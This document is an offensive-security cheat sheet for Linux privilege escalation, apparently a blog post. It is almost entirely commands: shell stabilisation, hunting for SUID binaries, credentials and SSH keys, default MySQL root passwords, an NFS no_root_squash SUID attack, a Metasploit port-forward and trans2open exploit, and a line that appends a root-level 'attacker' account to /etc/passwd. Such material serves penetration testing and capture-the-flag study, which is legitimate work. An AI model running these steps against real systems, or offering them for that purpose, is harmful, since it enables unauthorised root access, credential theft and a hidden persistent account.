---
title: Linux Privilege Escalation
lastmod: 2020-04-05T13:22:42-07:00
publishdate: 2020-04-03T13:22:42-07:00
author: Khanisgr8
draft: false
description: Guide to Linux Privilege Escalation.
tags: 
    - offensive
    - linux
    - Privilege

github: false
disable_toc: true
disable_qna: true


---



### Stable your shell:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
OR
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200
```


### Various Capabilities?
```bash
which gcc
which cc
which python
which perl
which wget
which curl
which fetch
which nc
which ncat
which nc.traditional
which socat
```

### Compilation
```bash
file /bin/bash
uname -a
cat /etc/*-release
cat /etc/issue
```


### What Arch ?
```bash
file /bin/bash

Kernel?
uname -a

Issue/Release?
cat /etc/issue
cat /etc/*-release

Are we a real user?
sudo -l
ls -lsaht /etc/sudoers
```

### Are any users a member of exotic groups?
`groups <user>`


### Check out your shell's environment variables.
```bash
env
https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
```

### Users?
```bash
cd /home/
ls -lsaht
```

### Web Configs containing credentials?
```bash
cd /var/www/html/
ls -lsaht
```

### SUID Binaries?
`find / -perm -u=s -type f 2>/dev/null`

### GUID Binaries?
`find / -perm -g=s -type f 2>/dev/null`

### SUID/GUID/SUDO Escalation:
`https://gtfobins.github.io/`


### start monitoring the system.
```bash
https://github.com/DominicBreuker/pspy/blob/master/README.md
cd /var/tmp/
File Transfer --> pspy32
File Transfer --> pspy64
chmod 755 pspy32 pspy64
./pspy<32/64>
```

### What does the local network look like?
```bash
netstat -antup
netstat -tunlp
```

### Is anything vulnerable running as root?
`ps aux |grep -i 'root' --color=auto`

### MYSQL Credentials? Root Unauthorized Access?
```bash
mysql -uroot -p
Enter Password:
root : root
root : toor
root :
```

### look at etc:
```bash
cd /etc/
ls -lsaht
Anything other than root here?
• Any config files left behind?
→ ls -lsaht |grep -i ‘.conf’ --color=auto

• If we have root priv information disclosure - are there any .secret in /etc/ files?
→ ls -lsaht |grep -i ‘.secret’ --color=aut
```

### SSH Keys for further compromise?
```bash
ls -lsaR /home/

Quick look in:
ls -lsaht /var/lib/
ls -lsaht /var/db/

Quick look in:
ls -lsaht /opt/
ls -lsaht /tmp/
ls -lsaht /var/tmp/
ls -lsaht /dev/shm/
```

### File Transfer Capability?
```bash
which wget
which curl
which nc
which fetch (BSD)
ls -lsaht /bin/ |grep -i 'ftp' --color=auto
```

### NFS? Can we exploit weak NFS Permissions?
```bash
cat /etc/exports
no_root_squash?
https://recipeforroot.com/attacking-nfs-shares/

[On Attacking Machine]
mkdir -p /mnt/nfs/
mount -t nfs -o vers=<version 1,2,3> $IP:<NFS Share> /mnt/nfs/ -nolock
gcc suid.c -o suid
cp suid /mnt/nfs/
chmod u+s /mnt/nfs/suid
su <user id matching target machine's user-level privilege.>

[On Target Machine]
user@host$ ./suid

```

###  read, write and execute files?
```bash
/var/tmp/
/tmp/
/dev/shm/
```

### Any exotic file system mounts/extended attributes?
`cat /etc/fstab`


### Forwarding out a weak service for root priv (with meterpreter!):

Do we need to get a meterpreter shell and forward out some ports that might be running off of the Loopback Adaptor (127.0.0.1) and forward them to any (0.0.0.0)? If I see something like Samba SMBD out of date on 127.0.0.1 - we should look to forward out the port and then run trans2open on our own machine at the forwarded port.
https://www.offensive-security.com/metasploit-unleashed/portfwd/

Forwarding out netbios-ssn EXAMPLE:
```bash
meterpreter> portfwd add –l 139 –p 139 –r [target remote host]
meterpreter> background
use exploit/linux/samba/trans2open
set RHOSTS 0.0.0.0
set RPORT 139
run
```

### Can we write as a low-privileged user to /etc/passwd?
```bash
openssl passwd -1
i<3hacking
$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.
echo 'attacker:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:attacker:/home/attacker:/bin/bash' >> /etc/passwd
su attacker
id
```

### Cron.
```bash
crontab –u root –l

Look for unusual system-wide cron jobs:
cat /etc/crontab
ls /etc/cron.*
```

### Bob is a user on this machine. What is every single file he has ever created?
`find / -user miguel 2>/dev/null`

### Any mail? mbox in User $HOME directory?
```bash
cd /var/mail/
ls -lsaht
```

### Linpease:
`https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS`

### Traitor:
`https://github.com/liamg/traitor`

### GTFOBins:
`https://gtfobins.github.io/`

### PSpy32/Pspy64:
`https://github.com/DominicBreuker/pspy/blob/master/README.md`

### Linux Privilege Escalation:
`https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/`